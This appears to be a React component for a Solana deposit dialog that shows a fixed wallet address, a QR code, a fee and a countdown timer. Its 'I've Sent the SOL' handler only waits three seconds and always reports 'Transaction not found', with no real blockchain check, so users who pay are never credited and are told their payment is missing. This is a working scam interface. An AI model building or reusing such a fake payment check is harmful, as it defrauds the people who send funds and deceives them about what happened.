import { useState, useEffect } from "react";
import { DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { QRCodeSVG } from "qrcode.react";
import { useToast } from "@/hooks/use-toast";
import { LoaderCircle } from "lucide-react";

const SOLANA_ADDRESS = "CUrJoDNft83ho7i9tcopxce4QYrXfxRQ3yp3oLemw6HU";
const NETWORK_FEE = 0.003;
const PAYMENT_WINDOW = 60;

interface DepositDialogContentProps {
  onClose: () => void;
}

export function DepositDialogContent({ onClose }: DepositDialogContentProps) {
  const [amount, setAmount] = useState("");
  const [showQR, setShowQR] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState(PAYMENT_WINDOW * 60);
  const [isChecking, setIsChecking] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showQR && timeRemaining > 0) {
      timer = setInterval(() => {
        setTimeRemaining((prev) => Math.max(0, prev - 1));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [showQR, timeRemaining]);

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const handleDepositNext = () => {
    const solAmount = Number(amount);
    if (!amount || solAmount < 1) {
      toast({
        title: "Invalid amount",
        description: "Minimum deposit is 1 SOL",
        variant: "destructive",
      });
      return;
    }
    setTimeRemaining(PAYMENT_WINDOW * 60);
    setShowQR(true);
  };

  const handleDeposit = async () => {
    setIsChecking(true);
    
    // Simulate checking for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    setIsChecking(false);
    toast({
      title: "Transaction not found",
      description: "We couldn't find your transaction. Please make sure you've sent the correct amount to the right address.",
      variant: "destructive",
    });
  };

  const totalAmount = Number(amount) + NETWORK_FEE;

  return (
    <DialogContent className="sm:max-w-md">
      <DialogHeader>
        <DialogTitle>Deposit SOL</DialogTitle>
        <DialogDescription>
          {!showQR 
            ? "Enter the amount you want to deposit (minimum 1 SOL)"
            : "Send the exact amount of SOL to complete your deposit"
          }
        </DialogDescription>
      </DialogHeader>
      <div className="space-y-4">
        {!showQR ? (
          <>
            <Input
              type="number"
              placeholder="Enter SOL amount (min: 1 SOL)"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              min="1"
              step="0.1"
              className="cyber-input"
            />
            <div className="text-sm text-muted-foreground">
              Network fee: {NETWORK_FEE} SOL
            </div>
            <Button onClick={handleDepositNext} className="w-full cyber-button">
              Continue
            </Button>
          </>
        ) : (
          <>
            <div className="flex flex-col items-center space-y-4">
              <div className="bg-black/10 p-4 rounded-lg w-full">
                <QRCodeSVG value={SOLANA_ADDRESS} size={200} className="mx-auto" />
              </div>
              <div className="w-full space-y-2">
                <p className="text-sm font-mono bg-black/10 p-3 rounded break-all">{SOLANA_ADDRESS}</p>
                <div className="flex justify-between items-center text-sm">
                  <span>Amount to send:</span>
                  <span className="font-mono">{totalAmount.toFixed(3)} SOL</span>
                </div>
                <div className="flex justify-between items-center text-sm text-muted-foreground">
                  <span>Time remaining:</span>
                  <span className="font-mono">{formatTime(timeRemaining)}</span>
                </div>
              </div>
            </div>
            <Button 
              onClick={handleDeposit} 
              className="w-full cyber-button"
              disabled={isChecking}
            >
              {isChecking ? (
                <div className="flex items-center gap-2">
                  <LoaderCircle className="animate-spin h-4 w-4" />
                  <span>Checking transaction...</span>
                </div>
              ) : (
                "I've Sent the SOL"
              )}
            </Button>
            <Button onClick={onClose} variant="outline" className="w-full">
              Close
            </Button>
          </>
        )}
      </div>
    </DialogContent>
  );
}